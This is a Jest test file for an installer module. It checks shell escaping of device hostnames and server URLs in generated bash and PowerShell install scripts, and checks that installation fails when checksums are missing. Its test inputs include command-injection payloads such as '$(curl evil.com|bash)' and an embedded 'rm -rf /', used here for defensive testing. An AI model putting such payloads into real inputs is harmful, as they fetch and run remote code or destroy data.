/**
 * Tests for routes/installer.js security fixes:
 *   - Layer 2: shell-appropriate escaping of device.hostname / config.server_url
 *     in generateInstallPs1 and generateInstallSh (command-injection defense).
 *   - Layer 3: fail-closed SHA256SUMS verification (missing checksum refuses
 *     to install rather than silently skipping).
 *
 * Layer 1 (hostname validation at creation) is covered in devices.routes.test.js.
 * Both layers are independently testable.
 */

const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Mock the DB pool so requiring installer.js has no real DB side effects.
// The pure helpers under test do not touch the pool, but the module loads it
// at require time.
const { mockPool } = require('./mockPool');
jest.mock('../src/db/pool', () => mockPool);

const installer = require('../src/routes/installer');

const { generateInstallPs1, generateInstallSh, fetchChecksums, escapeSh, escapePs1 } = installer;

beforeEach(() => {
  mockPool.query.reset();
});

// ---------------------------------------------------------------------------
// Layer 2: shell escaping helpers
// ---------------------------------------------------------------------------

describe('escapeSh — POSIX/bash single-quote escaping', () => {
  test('wraps a simple value in single quotes', () => {
    expect(escapeSh('DEV-001')).toBe("'DEV-001'");
  });

  test("escapes embedded single quotes via the close-escape-reopen idiom", () => {
    // a'b  ->  'a'\''b'
    expect(escapeSh("a'b")).toBe("'a'\\''b'");
  });

  test('leaves shell metacharacters literal (they are inside single quotes)', () => {
    const out = escapeSh('$(curl evil.com|bash)');
    // Metacharacters are preserved verbatim, just wrapped in single quotes.
    expect(out).toBe("'$(curl evil.com|bash)'");
  });

  test('handles empty string', () => {
    expect(escapeSh('')).toBe("''");
  });

  test('handles null/undefined as empty', () => {
    expect(escapeSh(null)).toBe("''");
    expect(escapeSh(undefined)).toBe("''");
  });
});

describe('escapePs1 — PowerShell single-quote escaping', () => {
  test('wraps a simple value in single quotes', () => {
    expect(escapePs1('DEV-001')).toBe("'DEV-001'");
  });

  test('doubles embedded single quotes', () => {
    // a'b  ->  'a''b'
    expect(escapePs1("a'b")).toBe("'a''b'");
  });

  test('leaves shell metacharacters literal (inside single quotes)', () => {
    const out = escapePs1('$(curl evil.com|bash)');
    expect(out).toBe("'$(curl evil.com|bash)'");
  });

  test('handles empty string', () => {
    expect(escapePs1('')).toBe("''");
  });
});

// ---------------------------------------------------------------------------
// Layer 2: generateInstallSh — bash script escaping (executable proof)
// ---------------------------------------------------------------------------

describe('generateInstallSh — hostname escaping (bash)', () => {
  const config = { server_url: 'https://admin.example.com' };

  test('defines DEVICE_HOSTNAME from a single-quoted, escaped literal', () => {
    const script = generateInstallSh(config, 'DEV-001');
    // The assignment must be single-quote-quoted (safe), not bare.
    expect(script).toMatch(/DEVICE_HOSTNAME='DEV-001'/);
    // The echo must use the variable, not interpolate the raw value.
    expect(script).toMatch(/echo "Device: \$DEVICE_HOSTNAME"/);
    // No raw interpolation of the hostname remains in executable contexts.
    expect(script).not.toMatch(/echo "Device: DEV-001"/);
  });

  test('does NOT interpolate a malicious hostname raw anywhere executable', () => {
    const payload = '$(curl evil.com|bash)';
    const script = generateInstallSh(config, payload);
    // The dangerous payload must only ever appear inside single quotes.
    // Assert there is no unquoted occurrence: every occurrence is wrapped.
    const safeQuoted = `'${payload}'`;
    expect(script).toContain(safeQuoted);
    // The old vulnerable form (raw interpolation into the echo) must be gone.
    expect(script).not.toMatch(/echo "Device: \$\(curl evil\.com\|bash\)"/);
    // Must use the variable in the echo line.
    expect(script).toMatch(/echo "Device: \$DEVICE_HOSTNAME"/);
  });

  test('escapes a hostname containing single quotes safely', () => {
    const payload = "a'$(id)b";
    const script = generateInstallSh(config, payload);
    // Expected escaped assignment: a'$(id)b  ->  'a'\''$(id)b'
    expect(script).toContain("DEVICE_HOSTNAME='a'\\''$(id)b'");
  });

  test('round-trips a command-substitution payload through real bash WITHOUT executing it', () => {
    // Strongest proof: source the generated assignment in real bash and verify
    // the variable holds the LITERAL payload (no command substitution ran).
    // Using $(echo PWNED) is harmless; if escaping is wrong, bash would
    // execute it and the variable would become "PWNED" instead of the literal.
    const payload = '$(echo PWNED)';
    const script = generateInstallSh(config, payload);

    // Extract the DEVICE_HOSTNAME=... assignment line.
    const line = script.split('\n').find(l => l.startsWith('DEVICE_HOSTNAME='));
    expect(line).toBeDefined();

    const tmp = path.join(os.tmpdir(), `lockdown-sh-test-${Date.now()}.sh`);
    fs.writeFileSync(tmp, `set -e\n${line}\nprintf '%s' "$DEVICE_HOSTNAME"\n`);
    try {
      const out = execSync(`bash ${tmp}`, { encoding: 'utf8' });
      // The variable must hold the literal payload — command substitution did NOT run.
      expect(out).toBe(payload);
      expect(out).not.toBe('PWNED');
    } finally {
      fs.unlinkSync(tmp);
    }
  });

  test('escapes server_url into SERVER_URL and uses the variable', () => {
    const maliciousConfig = { server_url: 'https://x";rm -rf /;"' };
    const script = generateInstallSh(maliciousConfig, 'DEV-001');
    expect(script).toMatch(/SERVER_URL='https:\/\/x";rm -rf \/;"'/);
    expect(script).toMatch(/echo "The agent will check in with the server at: \$SERVER_URL"/);
    // No raw server_url interpolation remains.
    expect(script).not.toMatch(/server at: https:\/\/x";rm -rf \/;"/);
  });
});

// ---------------------------------------------------------------------------
// Layer 2: generateInstallPs1 — PowerShell script escaping
// ---------------------------------------------------------------------------

describe('generateInstallPs1 — hostname escaping (PowerShell)', () => {
  const config = { server_url: 'https://admin.example.com' };

  test('defines $deviceHostname from a single-quoted, escaped literal', () => {
    const script = generateInstallPs1(config, 'DEV-001');
    expect(script).toMatch(/\$deviceHostname = 'DEV-001'/);
    // Uses the variable in the echo, not raw interpolation.
    expect(script).toMatch(/Write-Host "Device: \$deviceHostname"/);
  });

  test('does NOT interpolate a malicious hostname raw in executable contexts', () => {
    const payload = '$(curl evil.com|bash)';
    const script = generateInstallPs1(config, payload);
    // Payload only appears inside single quotes.
    expect(script).toContain(`$deviceHostname = '${payload}'`);
    // The old vulnerable raw-into-double-quoted-string form must be gone.
    expect(script).not.toMatch(/Write-Host "Device: \$\(curl evil\.com\|bash\)"/);
    // NSSM Description uses the variable.
    expect(script).toMatch(/Description "Anti-theft agent for \$deviceHostname"/);
  });

  test('doubles embedded single quotes in a malicious hostname', () => {
    // a'$(id)b  ->  'a''$(id)b'
    const payload = "a'$(id)b";
    const script = generateInstallPs1(config, payload);
    expect(script).toContain(`$deviceHostname = 'a''$(id)b'`);
  });

  test('escapes server_url into $serverUrl and uses the variable', () => {
    const maliciousConfig = { server_url: "https://x'$(id)'" };
    const script = generateInstallPs1(maliciousConfig, 'DEV-001');
    // PowerShell doubling: ' -> ''
    expect(script).toMatch(/\$serverUrl = 'https:\/\/x''\$\(id\)'''/);
    expect(script).toMatch(/Write-Host "The agent will check in with the server at: \$serverUrl"/);
  });

  test('benign hostname round-trips without corruption', () => {
    const script = generateInstallPs1(config, 'DEV-001');
    expect(script).toContain("$deviceHostname = 'DEV-001'");
    expect(script).toContain('Write-Host "Device: $deviceHostname"');
  });
});

// ---------------------------------------------------------------------------
// Layer 3: fail-closed SHA256SUMS verification
// ---------------------------------------------------------------------------

describe('fetchChecksums — fail closed when SHA256SUMS is missing', () => {
  test('rejects (throws) when the release has no SHA256SUMS asset', async () => {
    const release = { tag_name: 'v1.2.3', assets: [
      { name: 'lockdown-agent-linux-x64', browser_download_url: 'https://example.com/agent' },
    ] };
    await expect(fetchChecksums(release)).rejects.toThrow(/SHA256SUMS/);
  });

  test('rejects when the release has no assets at all', async () => {
    const release = { tag_name: 'v1.2.3', assets: [] };
    await expect(fetchChecksums(release)).rejects.toThrow(/SHA256SUMS/);
  });

  test('error message references the tag when present', async () => {
    const release = { tag_name: 'v9.9.9', assets: [] };
    await expect(fetchChecksums(release)).rejects.toThrow(/v9\.9\.9/);
  });

  test('error message falls back to "(unknown tag)" when tag absent', async () => {
    const release = { assets: [] };
    await expect(fetchChecksums(release)).rejects.toThrow(/\(unknown tag\)/);
  });
});
